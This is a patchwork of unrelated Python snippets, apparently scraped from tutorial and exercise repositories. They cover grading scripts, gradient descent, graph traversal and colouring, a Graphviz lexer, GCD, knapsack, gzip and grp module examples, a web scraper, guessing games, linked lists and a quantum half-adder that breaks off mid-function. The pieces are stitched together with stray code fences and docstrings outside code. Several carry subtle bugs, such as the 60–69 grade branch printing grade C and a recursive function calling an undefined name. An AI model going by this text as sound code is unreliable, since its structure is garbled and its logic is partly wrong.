grade_A = "Grade: Grade A"
grade_B = "Grade: Grade B"
grade_C = "Grade: Grade C"
grade_D = "Grade: Grade D"
grade_F = "Grade: Grade F (failed)"

# output
print("≈" * formation_num)  # for formation

print(f"   Name: {name}   Roll No: {roll_no }")
print(f"   Total Marks: {total_marks}   Obtained Marks: {obtained_marks}")
print(f"   Percentage: {percentage}%")

# grading
if percentage >= 90:
    print(f"   {grade_A}")
elif percentage >= 80:
    print(f"   {grade_B}")
elif percentage >= 70:
    print(f"   {grade_C}")
elif percentage >= 60:
    print(f"   {grade_C}")
elif percentage < 60:
    print(f"   {grade_D}")

print("*" * formation_num)  # for formation

cur_x = 3  # The algorithm starts at x=3
rate = 0.01  # Learning rate
precision = 0.000001  # This tells us when to stop the algorithm
previous_step_size = 1
max_iters = 10000  # maximum number of iterations
iters = 0  # iteration counter


def df(x):
    return 2 * (x + 5)  # Gradient of our function


while previous_step_size > precision and iters < max_iters:
    prev_x = cur_x  # Store current x value in prev_x
    cur_x = cur_x - rate * df(prev_x)  # Grad descent
    previous_step_size = abs(cur_x - prev_x)  # Change in x
    iters = iters + 1  # iteration count
    print("Iteration", iters, "\nX value is", cur_x)  # Print iterations

print("The local minimum occurs at", cur_x)
````

````pyImplementation of GradientBoostingRegressor in sklearn using the
   boston dataset which is very popular for regression problem to
   predict house price.```


```py

import matplotlib.pyplot as plt
import pandas as pd
from sklearn.datasets import load_boston
from sklearn.ensemble import GradientBoostingRegressor
from sklearn.metrics import mean_squared_error, r2_score
from sklearn.model_selection import train_test_split


def main():

    # loading the dataset from the sklearn
    df = load_boston()
    print(df.keys())
    # now let construct a data frame
    df_boston = pd.DataFrame(df.data, columns=df.feature_names)
    # let add the target to the dataframe
    df_boston["Price"] = df.target
    # print the first five rows using the head function
    print(df_boston.head())
    # Summary statistics
    print(df_boston.describe().T)
    # Feature selection

    X = df_boston.iloc[:, :-1]
    y = df_boston.iloc[:, -1]  # target variable
    # split the data with 75% train and 25% test sets.
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, random_state=0, test_size=0.25
    )

    model = GradientBoostingRegressor(
        n_estimators=500, max_depth=5, min_samples_split=4, learning_rate=0.01
    )
    # training the model
    model.fit(X_train, y_train)
    # to see how good the model fit the data
    training_score = model.score(X_train, y_train).round(3)
    test_score = model.score(X_test, y_test).round(3)
    print("Training score of GradientBoosting is :", training_score)
    print("The test score of GradientBoosting is :", test_score)
    # Let us evaluation the model by finding the errors
    y_pred = model.predict(X_test)

    # The mean squared error
    print("Mean squared error: %.2f" % mean_squared_error(y_test, y_pred))
    # Explained variance score: 1 is perfect prediction
    print("Test Variance score: %.2f" % r2_score(y_test, y_pred))

    # So let's run the model against the test data
    fig, ax = plt.subplots()
    ax.scatter(y_test, y_pred, edgecolors=(0, 0, 0))
    ax.plot([y_test.min(), y_test.max()], [y_test.min(), y_test.max()], "k--", lw=4)
    ax.set_xlabel("Actual")
    ax.set_ylabel("Predicted")
    ax.set_title("Truth vs Predicted")
    # this show function will display the plotting
    plt.show()


if __name__ == "__main__":
    main()

class Node(object):
    def __init__(self, name):
        self.name = name
        self.adjacencyList = []
        self.visited = False
        self.predecessor = None


class BreadthFirstSearch(object):
    def bfs(self, startNode):

        queue = []
        queue.append(startNode)
        startNode.visited = True

        # BFS -> queue      DFS --> stack BUT usually we implement it with recursion !!!
        while queue:

            actualNode = queue.pop(0)
            print("%s " % actualNode.name)

            for n in actualNode.adjacencyList:
                if not n.visited:
                    n.visited = True
                    queue.append(n)


node1 = Node("A")
node2 = Node("B")
node3 = Node("C")
node4 = Node("D")
node5 = Node("E")

node1.adjacencyList.append(node2)
node1.adjacencyList.append(node3)
node2.adjacencyList.append(node4)
node4.adjacencyList.append(node5)

bfs = BreadthFirstSearch()
bfs.bfs(node1)

class Node(object):
    def __init__(self, name):
        self.name = name
        self.adjacencyList = []
        self.visited = False
        self.predecessor = None


class DepthFirstSearch(
    object
):  # BFS -> queue + layer by layer algorithm   DFS -> stack + goes
    # as deep as possible into the tree !!!

    def dfs(self, node):

        node.visited = True
        print("%s " % node.name)

        for n in node.adjacencyList:
            if not n.visited:
                self.dfs(n)


node1 = Node("A")
node2 = Node("B")
node3 = Node("C")
node4 = Node("D")
node5 = Node("E")

node1.adjacencyList.append(node2)
node1.adjacencyList.append(node3)
node2.adjacencyList.append(node4)
node4.adjacencyList.append(node5)

dfs = DepthFirstSearch()
dfs.dfs(node1)

from __future__ import print_function

# Author: OMKAR PATHAK

# We can use Python's dictionary for constructing the graph


class AdjacencyList(object):
    def __init__(self):
        self.List = {}

    def addEdge(self, fromVertex, toVertex):
        # check if vertex is already present
        if fromVertex in self.List.keys():
            self.List[fromVertex].append(toVertex)
        else:
            self.List[fromVertex] = [toVertex]

    def printList(self):
        for i in self.List:
            print((i, "->", " -> ".join([str(j) for j in self.List[i]])))


if __name__ == "__main__":
    al = AdjacencyList()
    al.addEdge(0, 1)
    al.addEdge(0, 4)
    al.addEdge(4, 1)
    al.addEdge(4, 3)
    al.addEdge(1, 0)
    al.addEdge(1, 4)
    al.addEdge(1, 3)
    al.addEdge(1, 2)
    al.addEdge(2, 3)
    al.addEdge(3, 4)

    al.printList()

    # OUTPUT:
    # 0 -> 1 -> 4
    # 1 -> 0 -> 4 -> 3 -> 2
    # 2 -> 3
    # 3 -> 4
    # 4 -> 1 -> 3
````

```py
Aim: Given an undirected graph and an integer M. The task is to determine if
     the graph can be colored with at most M colors such that no two adjacent
     vertices of the graph are colored with the same color.
Intuition: We consider all the different combinations of the colors for the
           given graph using backtacking.
```

```py


def isSafe(graph, v, n, temp, color):
    # This checks whether if it safe to color the given node with temp color i.e checking if the adjacent nodes are different from temp
    for i in range(v):
        if graph[n][i] == 1 and color[i] == temp:
            return False
    return True


def check(graph, m, v, n, color):
    # This function iteratively checks different combinations.
    if n == v:  # base case : if all the nodes are traversed return
        return True
    for i in range(1, m + 1):
        if isSafe(graph, v, n, i, color):  # checking if it is safe to color
            color[n] = i
            if check(graph, m, v, n + 1, color):
                return True
            color[n] = 0
    return False


def graphcoloring(graph, M, V):
    color = [0] * (V + 1)  # assigning colors to different nodes
    return check(graph, M, V, 0, color)


# ------------------------DRIVER CODE ------------------------


def main():
    for _ in range(int(input())):
        V = int(input())
        M = int(input())
        E = int(input())
        list = [int(x) for x in input().strip().split()]
        graph = [[0 for i in range(V)] for j in range(V)]
        cnt = 0
        for i in range(E):
            graph[list[cnt] - 1][list[cnt + 1] - 1] = 1
            graph[list[cnt + 1] - 1][list[cnt] - 1] = 1
            cnt += 2
        if graphcoloring(graph, M, V) == True:
            print(1)
        else:
            print(0)


if __name__ == "__main__":
    main()
```

```py
Sample Input:
2
4
3
5
1 2 2 3 3 4 4 1 1 3
3
2
3
1 2 2 3 1 3

Sample Output:
1
0
```

```py

#!/usr/bin/python
```

````py
Demonstration of Graph and BokehGraph functionality.```


```py

from sys import argv


def main():
    pass  # TODO


if __name__ == "__main__":
    # TODO - parse argv
    main()

from __future__ import print_function


class Graph:
    def __init__(self, vertex):
        self.vertex = vertex
        self.graph = [[0] for i in range(vertex)]

    def add_edge(self, u, v):
        self.graph[u - 1].append(v - 1)

    def show(self):
        for i in range(self.vertex):
            print("%d: " % (i + 1), end=" ")
            for j in self.graph[i]:
                print("%d-> " % (j + 1), end=" ")
            print(" ")


g = Graph(100)

g.add_edge(1, 3)
g.add_edge(2, 3)
g.add_edge(3, 4)
g.add_edge(3, 5)
g.add_edge(4, 5)


g.show()

class Graph:
    def __init__(self, vertex):
        self.vertex = vertex
        self.graph = [[0] * vertex for i in range(vertex)]

    def add_edge(self, u, v):
        self.graph[u - 1][v - 1] = 1
        self.graph[v - 1][u - 1] = 1

    def show(self):

        for i in self.graph:
            for j in i:
                print(j, end=" ")
            print(" ")


g = Graph(100)

g.add_edge(1, 4)
g.add_edge(4, 2)
g.add_edge(4, 5)
g.add_edge(2, 5)
g.add_edge(5, 3)
g.show()

#!/usr/bin/env python```


```py
Solution to Project Euler Problems
http://projecteuler.net/

by Apalala <apalala@gmail.com>
(cc) Attribution-ShareAlike
http://creativecommons.org/licenses/by-sa/3.0/

````

```py
from collections import namedtuple
from copy import deepcopy
from heapq import heappop, heappush

Node = namedtuple("Node", "cost i j")
Graph = namedtuple("Graph", "nodes edges")


def build_graph_from_triangle(triangle):
    T = deepcopy(triangle)
    edges = {}
    for i in range(len(T)):
        for j, c in enumerate(T[i]):
            n = Node(c, i, j)
            edges[n] = []
            T[i][j] = n
    for i in range(len(T) - 1):
        for j in range(len(T[i])):
            n = T[i][j]
            edges[n].append(T[i + 1][j])
            edges[n].append(T[i + 1][j + 1])
    stop = Node(0, -1, -1)
    edges[stop] = []
    for j in range(len(T[-1]) - 1):
        edges[T[-1][j]].append(stop)
    start = T[0][0]
    return (Graph(edges.keys(), edges), start, stop)


def find_max_path(graph, start, stop):
    f = max(n.cost for n in graph.nodes)
    heap = [(f - start.cost, start, [])]
    while heap:
        c, n, p = heappop(heap)
        if n == stop:
            return (f + f * len(p) - c, list(reversed([(x.i, x.j) for x in p])))
        for m in graph.edges[n]:
            heappush(heap, (f - m.cost + c, m, [n] + p))
```

````py
    pygments.lexers.graphviz
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexer for the DOT language (graphviz).

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.lexer import RegexLexer, bygroups
from pygments.token import (
    Comment,
    Keyword,
    Operator,
    Name,
    String,
    Number,
    Punctuation,
    Whitespace,
)


__all__ = ["GraphvizLexer"]


class GraphvizLexer(RegexLexer):
    """
    For graphviz DOT graph description language.

    .. versionadded:: 2.8
    """

    name = "Graphviz"
    aliases = ["graphviz", "dot"]
    filenames = ["*.gv", "*.dot"]
    mimetypes = ["text/x-graphviz", "text/vnd.graphviz"]
    tokens = {
        "root": [
            (r"\s+", Whitespace),
            (r"(#|//).*?$", Comment.Single),
            (r"/(\\\n)?[*](.|\n)*?[*](\\\n)?/", Comment.Multiline),
            (r"(?i)(node|edge|graph|digraph|subgraph|strict)\b", Keyword),
            (r"--|->", Operator),
            (r"[{}[\]:;,]", Punctuation),
            (
                r"(\b\D\w*)(\s*)(=)(\s*)",
                bygroups(Name.Attribute, Whitespace, Punctuation, Whitespace),
                "attr_id",
            ),
            (r"\b(n|ne|e|se|s|sw|w|nw|c|_)\b", Name.Builtin),
            (r"\b\D\w*", Name.Tag),  # node
            (r"[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))", Number),
            (r'"(\\"|[^"])*?"', Name.Tag),  # quoted node
            (r"<", Punctuation, "xml"),
        ],
        "attr_id": [
            (r"\b\D\w*", String, "#pop"),
            (r"[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))", Number, "#pop"),
            (r'"(\\"|[^"])*?"', String.Double, "#pop"),
            (r"<", Punctuation, ("#pop", "xml")),
        ],
        "xml": [
            (r"<", Punctuation, "#push"),
            (r">", Punctuation, "#pop"),
            (r"\s+", Whitespace),
            (r"[^<>\s]", Name.Tag),
        ],
    }

#!/usr/bin/env python
# -*- coding: utf-8; mode: python -*-```


```py
A simple python implementation of Gravatar Image requests (using their API).

- Author: Lilian Besson, (C) 2013.
- Online: https://bitbucket.org/lbesson/bin/src/master/gravatar.py
- Licence: MIT Licence (http://lbesson.mit-license.org).```


```py

from __future__ import print_function  # Python 2/3 compatibility !

# import code for encoding urls and generating md5 hashes
import urllib
import hashlib

# Set the default picture
# default = "http://perso.crans.org/besson/.besson.jpg"
default = "retro"

size = 256
secure = True


def gravatar(email, default=default, size=size, secure=secure):
    """
    gravatar(email, default=default, size=size, secure=secure) -> string"

    Return the URL of the gravatar picture associated with @email.
    @default: default picture to use if not available. Default is %s.
    @size: format to use (pixel x pixel). Default is %i.
    @secure: if true, the returned URL use https://secure.gravatar.com instead of http://www.gravatar.com. Default is %s."
    """ % (
        default,
        size,
        secure,
    )
    if secure:
        gravatar_url = (
            "https://secure.gravatar.com/avatar/"
            + hashlib.md5(email.lower()).hexdigest()
            + "?r=pg&"
        )
    else:
        gravatar_url = (
            "http://www.gravatar.com/avatar/"
            + hashlib.md5(email.lower()).hexdigest()
            + "?r=pg&"
        )
    gravatar_url += urllib.urlencode({"d": default, "s": str(size)})
    return gravatar_url


if __name__ == "__main__":
    # Set the email address to check
    email = "lbessonATens-cachanDOTfr".replace("AT", "@").replace("DOT", ".")
    print("For the email adress " + email)
    print(gravatar(email))
    email = "ameliaDOTnoreenATgmailDOTcom".replace("AT", "@").replace("DOT", ".")
    print("For the email adress " + email)
    print(gravatar(email))
````

````py
Greatest Common Divisor.

Wikipedia reference: https://en.wikipedia.org/wiki/Greatest_common_divisor

gcd(a, b) = gcd(a, -b) = gcd(-a, b) = gcd(-a, -b) by definition of divisibility```


```py


def greatest_common_divisor(a: int, b: int) -> int:
    """
    Calculate Greatest Common Divisor (GCD).
    >>> greatest_common_divisor(24, 40)
    8
    >>> greatest_common_divisor(1, 1)
    1
    >>> greatest_common_divisor(1, 800)
    1
    >>> greatest_common_divisor(11, 37)
    1
    >>> greatest_common_divisor(3, 5)
    1
    >>> greatest_common_divisor(16, 4)
    4
    >>> greatest_common_divisor(-3, 9)
    3
    >>> greatest_common_divisor(9, -3)
    3
    >>> greatest_common_divisor(3, -9)
    3
    >>> greatest_common_divisor(-3, -9)
    3
    """
    return abs(b) if a == 0 else greatest_common_divisor(b % a, a)


def gcd_by_iterative(x: int, y: int) -> int:
    """
    Below method is more memory efficient because it does not create additional
    stack frames for recursive functions calls (as done in the above method).
    >>> gcd_by_iterative(24, 40)
    8
    >>> greatest_common_divisor(24, 40) == gcd_by_iterative(24, 40)
    True
    >>> gcd_by_iterative(-3, -9)
    3
    >>> gcd_by_iterative(3, -9)
    3
    >>> gcd_by_iterative(1, -800)
    1
    >>> gcd_by_iterative(11, 37)
    1
    """
    while y:  # --> when y=0 then loop will terminate and return x as final GCD.
        x, y = y, x % y
    return abs(x)


def main():
    """
    Call Greatest Common Divisor function.
    """
    try:
        nums = input("Enter two integers separated by comma (,): ").split(",")
        num_1 = int(nums[0])
        num_2 = int(nums[1])
        print(
            f"greatest_common_divisor({num_1}, {num_2}) = "
            f"{greatest_common_divisor(num_1, num_2)}"
        )
        print(f"By iterative gcd({num_1}, {num_2}) = {gcd_by_iterative(num_1, num_2)}")
    except (IndexError, UnboundLocalError, ValueError):
        print("Wrong input")


if __name__ == "__main__":
    main()

class things:
    def __init__(self, name, value, weight):
        self.name = name
        self.value = value
        self.weight = weight

    def __repr__(self):
        return f"{self.__class__.__name__}({self.name}, {self.value}, {self.weight})"

    def get_value(self):
        return self.value

    def get_name(self):
        return self.name

    def get_weight(self):
        return self.weight

    def value_Weight(self):
        return self.value / self.weight


def build_menu(name, value, weight):
    menu = []
    for i in range(len(value)):
        menu.append(things(name[i], value[i], weight[i]))
    return menu


def greedy(item, maxCost, keyFunc):
    itemsCopy = sorted(item, key=keyFunc, reverse=True)
    result = []
    totalValue, total_cost = 0.0, 0.0
    for i in range(len(itemsCopy)):
        if (total_cost + itemsCopy[i].get_weight()) <= maxCost:
            result.append(itemsCopy[i])
            total_cost += itemsCopy[i].get_weight()
            totalValue += itemsCopy[i].get_value()
    return (result, totalValue)


def test_greedy():
    """
    >>> food = ["Burger", "Pizza", "Coca Cola", "Rice",
    ...         "Sambhar", "Chicken", "Fries", "Milk"]
    >>> value = [80, 100, 60, 70, 50, 110, 90, 60]
    >>> weight = [40, 60, 40, 70, 100, 85, 55, 70]
    >>> foods = build_menu(food, value, weight)
    >>> foods  # doctest: +NORMALIZE_WHITESPACE
    [things(Burger, 80, 40), things(Pizza, 100, 60), things(Coca Cola, 60, 40),
     things(Rice, 70, 70), things(Sambhar, 50, 100), things(Chicken, 110, 85),
     things(Fries, 90, 55), things(Milk, 60, 70)]
    >>> greedy(foods, 500, things.get_value)  # doctest: +NORMALIZE_WHITESPACE
    ([things(Chicken, 110, 85), things(Pizza, 100, 60), things(Fries, 90, 55),
      things(Burger, 80, 40), things(Rice, 70, 70), things(Coca Cola, 60, 40),
      things(Milk, 60, 70)], 570.0)
    """


if __name__ == "__main__":
    import doctest

    doctest.testmod()

# Imagine a school that children attend for years. In each year, there are a certain number of groups started, marked with the letters. So if years = 7 and groups = 4For the first year, the groups are 1a, 1b, 1c, 1d, and for the last year, the groups are 7a, 7b, 7c, 7d.
#
# Write a function that returns the groups in the school by year (as a string), separated with a comma and space in the form of "1a, 1b, 1c, 1d, 2a, 2b (....) 6d, 7a, 7b, 7c, 7d".
#
# Examples:
#
# csSchoolYearsAndGroups(years = 7, groups = 4) ➞ "1a, 1b, 1c, 1d, 2a, 2b, 2c, 2d, 3a, 3b, 3c, 3d, 4a, 4b, 4c, 4d, 5a, 5b, 5c, 5d, 6a, 6b, 6c, 6d, 7a, 7b, 7c, 7d"
# Notes:
#
# 1 <= years <= 10
# 1 <= groups <=26
# [execution time limit] 4 seconds (py3)
#
# [input] integer years
#
# [input] integer groups
#
# [output] string
#
# [Python 3] Syntax Tips
#
# # Prints help message to the console
# # Returns a string
# def helloWorld(name):
#     print("This prints to the console when you Run Tests")
#     return "Hello, " + name

import collections


class Solution:
    def groupAnagrams(self, strs: List[str]) -> List[List[str]]:
        word = collections.defaultdict(list)
        for s in strs:
            word[tuple(sorted(s))].append(s)
        return word.values()

import collections


def groupAnagrams(strs):
    # """
    # TimeComplexity: O(n*K*log(K)) where n is the length of strs and K is the length of the longest string
    #  in strs
    # """
    # seen = {}
    # for s in strs:
    #     ele = tuple((sorted(s)))
    #     if ele in seen:
    #         seen[ele].append(s)
    #     else:
    #         seen[ele] = [s]
    # return seen.values()
    """
    Time Complexity: O (N*K)
    """
    d = collections.defaultdict(list)
    for s in strs:
        count = [0] * 26
        for char in s:
            count[ord(char) - 97] += 1
        d[tuple(count)].append(s)
    return d.values()


print(groupAnagrams(["eat", "tea", "tan", "ate", "nat", "bat"]))

def growingPlant(upSpeed, downSpeed, desiredHeight):
    height = 0
    days = 1
    height += upSpeed
    while height < desiredHeight:
        days += 1
        height -= downSpeed
        height += upSpeed
    return days

# Copyright 2009 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```









---


```py


# end_pymotw_header
import grp
import textwrap

# Load all of the user data, sorted by username
all_groups = grp.getgrall()
interesting_groups = {g.gr_name: g for g in all_groups if not g.gr_name.startswith("_")}
print(len(interesting_groups.keys()))

# Find the longest length for a few fields
name_length = max(len(k) for k in interesting_groups) + 1
gid_length = max(len(str(u.gr_gid)) for u in interesting_groups.values()) + 1

# Set the members field width to avoid table columns
# wrapping
members_width = 19

# Print report headers
fmt = " ".join(["{:<{name_length}}", "{:{gid_length}}", "{:<{members_width}}"])
print(
    fmt.format(
        "Name",
        "GID",
        "Members",
        name_length=name_length,
        gid_length=gid_length,
        members_width=members_width,
    )
)
print("-" * name_length, "-" * gid_length, "-" * members_width)

# Print the data
prefix = " " * (name_length + gid_length + 2)
for name, g in sorted(interesting_groups.items()):
    # Format members to start in the column on the same line but
    # wrap as needed with an indent sufficient to put the
    # subsequent lines in the members column. The two indent
    # prefixes need to be the same to compute the wrap properly,
    # but the first should not be printed so strip it.
    members = textwrap.fill(
        ", ".join(g.gr_mem),
        initial_indent=prefix,
        subsequent_indent=prefix,
        width=members_width + len(prefix),
    ).strip()
    print(
        fmt.format(
            g.gr_name,
            g.gr_gid,
            members,
            name_length=name_length,
            gid_length=gid_length,
            members_width=members_width,
        )
    )

# Copyright 2009 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```









---


```py


# end_pymotw_header
import grp
import os

filename = "grp_getgrgid_fileowner.py"
stat_info = os.stat(filename)
owner = grp.getgrgid(stat_info.st_gid).gr_name

print("{} is owned by {} ({})".format(filename, owner, stat_info.st_gid))

# Copyright 2009 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```









---


```py


# end_pymotw_header
import grp
import os

gid = os.getgid()
group_info = grp.getgrgid(gid)
print("Currently running with GID={} name={}".format(gid, group_info.gr_name))

# Copyright 2009 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```









---


```py


# end_pymotw_header
import grp

name = "admin"
info = grp.getgrnam(name)
print("Name    :", info.gr_name)
print("GID     :", info.gr_gid)
print("Password:", info.gr_passwd)
print("Members :", ", ".join(info.gr_mem))

# Copyright 2009 Doug Hellmann.
#
#
#                         All Rights Reserved
#

#

```









---


```py


# end_pymotw_header
import grp

username = "dhellmann"
group_names = set(g.gr_name for g in grp.getgrall() if username in g.gr_mem)
print(username, "belongs to:", ", ".join(sorted(group_names)))

import requests
import openpyxl
import bs4
import os
import argparse
from fake_useragent import UserAgent

ua = UserAgent()
header = {"User-Agent": ua.random}

ap = argparse.ArgumentParser()
ap.add_argument(
    "-t",
    "--tech",
    required=True,
    help="Technology for which Organizations to be searched",
)
args = vars(ap.parse_args())

technology = args["tech"]
str(technology)

url = "https://summerofcode.withgoogle.com/archive/2020/organizations/"

res = requests.get(url)
res.raise_for_status()

soup = bs4.BeautifulSoup(res.text, "html.parser")

organizations = soup.select('h4[class="organization-card__name font-black-54"]')

all_org_Link = soup.find_all("a", class_="organization-card__link")
tech_Status = ["No"] * len(organizations)
org_Tech_URL = ["none"] * len(all_org_Link)

tech_index = 0

for link in all_org_Link:

    comp_Link = link.get("href")
    comp_url = "https://summerofcode.withgoogle.com" + comp_Link

    print(tech_index)
    print(comp_url)

    org_Tech_URL[tech_index] = comp_url
    res2 = requests.get(comp_url)
    res2.raise_for_status()

    soup2 = bs4.BeautifulSoup(res2.text, "html.parser")

    comp_Tech = soup2.find_all(
        "li", class_="organization__tag organization__tag--technology"
    )

    for name in comp_Tech:

        if technology in name.getText():
            tech_Status[tech_index] = "Yes"

    tech_index = tech_index + 1

wb = openpyxl.Workbook()
sheet = wb["Sheet"]

sheet.cell(row=1, column=1).value = "Organization"

sheet.cell(row=1, column=2).value = "Does {0} Technology Offered?".format(technology)
sheet.cell(row=1, column=3).value = "Link for the Organization"

for i in range(0, len(organizations)):
    sheet.cell(row=i + 2, column=1).value = organizations[i].getText()
    sheet.cell(row=i + 2, column=2).value = tech_Status[i]
    sheet.cell(row=i + 2, column=3).value = org_Tech_URL[i]

file_name = "GSoC_Org_List"

while os.path.isfile(file_name + ".xlsx"):
    file_name = file_name + "_"

wb.save(file_name + ".xlsx")

# library for getting a random number
import random
import math

num = random.randint(0, 20)

num1 = random.randint(
    3, 6
)  # for number of chances. i am taking the number which should be greater than or equal to 3 to make user friendly game

print("--Welcome to Guess The Number Game--")
print("\n you have " + str(num1) + " chances to guess the number")
count = 0
# Iterate using while loop
while count < num1:
    count += 1
    res = int(input("Please input a number between 0 and 20:"))
    try:
        val = int(res)
    except ValueError:
        print("This is not a valid integer. Please try again!")
        continue
    # Check whether the user input is high or low than the random number generated.
    if val < num:
        print("This is lower than actual number. Please try again!")
    elif val > num:
        print("This is higher than actual number. Please try again!")
    else:
        # Final result will be printed with this message as the user input matches the random number generated
        print("Hurray! you won, this is the correct number🥳")
        exit(0)
        guessCheck = "correct"
if count >= num1:
    print("the number is " + str(num) + " and you loose the game ☹️")
print("Thank you for playing Guess The Number. See you again!")

import random

print("------------------------------")
print("     M&M guessing game!")
print("------------------------------")

print("Guess the number of M&Ms and you get lunch on the house!")
print()

mm_count = random.randint(1, 100)
attempt_limit = 5
attempts = 0

while attempts < attempt_limit:
    guess_text = input("How many M&Ms are in the jar? ")
    guess = int(guess_text)
    attempts += 1

    if mm_count == guess:
        print(f"You got a free lunch! It was {guess}.")
        break
    elif guess < mm_count:
        print("Sorry, that's too LOW!")
    else:
        print("That's too HIGH!")

print(f"Bye, you're done in {attempts}!")

# problem:
# 1. access verts/vertex
# 2. get all connections for a vertex(hopefully quick)
#
# class Graph:
#     def __init(slef):

# graphs exists without forsing a class/certan data type on them

graph = [
    [0, 1, 1, 1, 0],
    [0, 0, 0, 0, 0],
    [0, 0, 0, 0, 1],
    [0, 0, 0, 0, 1],
    [0, 0, 0, 0, 0],
    # a new vertex and all vertexes connect to F
    # [1, 1, 1, 1, 1]
]

# get second vertex and its edges
graph[1]  # o(1) opp

# find if rd and last vertex are connected:
print(graph[2][4] == 1)

# make a new connection from B to E:

graph[1][4] = 1

# add a new veterx, append to our graph
# expensive

graph_list = {
    "a": set(["b", "c", "d"]),  # order doesnt matter we get a lot of dictionaries
    "b": set(),
    "c": set(["e"]),
    "d": set(["e"]),
    "e": set(),
}

# graph_list.key()

# find out if c connects to e:
print("e" in graph_list["c"])

# find out if a and e are connected:
print("e" in graph_list["a"])

# graph lists are great for adding o(1) and traversing and printing paths
all_paths = []


def print_graph(current_vertex, path):
    print(current_vertex)
    new_path = path + [current_vertex]
    # i have reached the end of my path bc the neighbore set is empty:
    if len(graph_list[current_vertex]) == 0:
        all_paths.append(new_path)
    # recurse on the children
    for neighbor in graph_list[current_vertex]:
        print_graph(neighbor, new_path.copy())


print_graph("a", [])
print(all_paths)


def print_tree_preorder(root):  # preorder traversal
    print(root.value)

    # if you can go left, recurse left
    if root.left:
        print_tree(root.left)

    if root.right:
        print_tree(root.right)

class LinkedListNode:
    def __init__(self, value):
        self.value = value
        self.next = (
            None
        )  # a variable to call to the next node/pointer/another instance of this class


def add_to_head(head, value):
    # create the new node
    new_node = LinkedListNode(value)
    # link up the nodes
    new_node.next = head
    return new_node  # the start of the linked list/the first node now


def add_to_next(current_node, value):
    # create new node
    new_node = LinkedListNode(value)
    next_node = current_node.next
    # current node points to new node
    current_node.next = new_node
    new_node.next = next_node


def add_to_tail(tail, value):
    # create new node
    new_node = LinkedListNode(value)
    # linked the new node to the tail
    tail.next = new_node
    return new_node  # the end of the linked list


# def print_list(start_node):
#     if start_node is None:
#         return
#     print(start_node.value)
#     print_list(start_node.next)


def print_list(start_node):
    curr_node = start_node

    while curr_node is not None:
        print(curr_node.value)
        # update curent node to next
        curr_node = curr_node.next


linked_list = LinkedListNode(
    3
)  # or head also this is a new instance of the class LinkedListNode
tail = linked_list

linked_list = add_to_head(linked_list, 2)
linked_list = add_to_head(linked_list, 5)
middle = linked_list
linked_list = add_to_head(linked_list, 6)
linked_list = add_to_head(linked_list, 0)
linked_list = add_to_head(linked_list, 2)

add_to_tail(tail, 12)
# print(linked_list.value)
# print(linked_list.next.value)
print(type(linked_list))

add_to_next(middle, 7)
# print(middle.value)
# print(tail.value)

print_list(linked_list)

```









---


```py


# end_pymotw_header
import gzip
from io import BytesIO
import binascii

uncompressed_data = b"The same line, over and over.\n" * 10
print("UNCOMPRESSED:", len(uncompressed_data))
print(uncompressed_data)

buf = BytesIO()
with gzip.GzipFile(mode="wb", fileobj=buf) as f:
    f.write(uncompressed_data)

compressed_data = buf.getvalue()
print("COMPRESSED:", len(compressed_data))
print(binascii.hexlify(compressed_data))

inbuffer = BytesIO(compressed_data)
with gzip.GzipFile(mode="rb", fileobj=inbuffer) as f:
    reread_data = f.read(len(uncompressed_data))

print("\nREREAD:", len(reread_data))
print(reread_data)

```









---


```py


# end_pymotw_header
import gzip
import io
import os
import hashlib


def get_hash(data):
    return hashlib.md5(data).hexdigest()


data = open("lorem.txt", "r").read() * 1024
cksum = get_hash(data.encode("utf-8"))


print("Level  Size        Checksum")
print("-----  ----------  ---------------------------------")
print("data   {:>10}  {}".format(len(data), cksum))

for i in range(0, 10):
    filename = "compress-level-{}.gz".format(i)
    with gzip.open(filename, "wb", compresslevel=i) as output:
        with io.TextIOWrapper(output, encoding="utf-8") as enc:
            enc.write(data)
    size = os.stat(filename).st_size
    cksum = get_hash(open(filename, "rb").read())
    print("{:>5d}  {:>10d}  {}".format(i, size, cksum))

```









---


```py


# end_pymotw_header
import gzip
import io

with gzip.open("example.txt.gz", "rb") as input_file:
    with io.TextIOWrapper(input_file, encoding="utf-8") as dec:
        print(dec.read())

```









---


```py


# end_pymotw_header
import gzip

with gzip.open("example.txt.gz", "rb") as input_file:
    print("Entire file:")
    all_data = input_file.read()
    print(all_data)

    expected = all_data[5:15]

    # rewind to beginning
    input_file.seek(0)

    # move ahead 5 bytes
    input_file.seek(5)
    print("Starting at position 5 for 10 bytes:")
    partial = input_file.read(10)
    print(partial)

    print()
    print(expected == partial)

```









---


```py


# end_pymotw_header
import gzip
import io
import os

outfilename = "example.txt.gz"
with gzip.open(outfilename, "wb") as output:
    with io.TextIOWrapper(output, encoding="utf-8") as enc:
        enc.write("Contents of the example file go here.\n")

print(outfilename, "contains", os.stat(outfilename).st_size, "bytes")
os.system("file -b --mime {}".format(outfilename))

```









---


```py


# end_pymotw_header
import gzip
import io
import itertools
import os

with gzip.open("example_lines.txt.gz", "wb") as output:
    with io.TextIOWrapper(output, encoding="utf-8") as enc:
        enc.writelines(itertools.repeat("The same line, over and over.\n", 10))

os.system("gzcat example_lines.txt.gz")

#!/usr/bin/env python3```


```py
Build a half-adder quantum circuit that takes two bits as input,
encodes them into qubits, then runs the half-adder circuit calculating
the sum and carry qubits, observed over 1000 runs of the experiment
.

References:
https://en.wikipedia.org/wiki/Adder_(electronics)
https://qiskit.org/textbook/ch-states/atoms-computation.html#4.2-Remembering-how-to-add-```


```py

import qiskit as q


def half_adder(bit0: int, bit1: int) -> q.result.counts.Counts:
    """
    >>> half_adder(0, 0)
    {'00': 1000}
    >>> half_adder(0, 1)
    {'01': 1000}
    >>> half_adder(1, 0)
    {'01': 1000}
    >>> half_adder(1, 1)
    {'10': 1000}
    """
    # Use Aer's qasm_simulator
    simulator = q.Aer.get_backend("qasm_simulator")

    qc_ha = q.QuantumCircuit(4, 2)
    # encode inputs in qubits 0 and 1
    if bit0 == 1:
        qc_ha.x(0)
    if bit1 == 1:
        qc_ha.x(1)
    qc_ha.barrier()

    # use cnots to write XOR of the inputs on qubit2
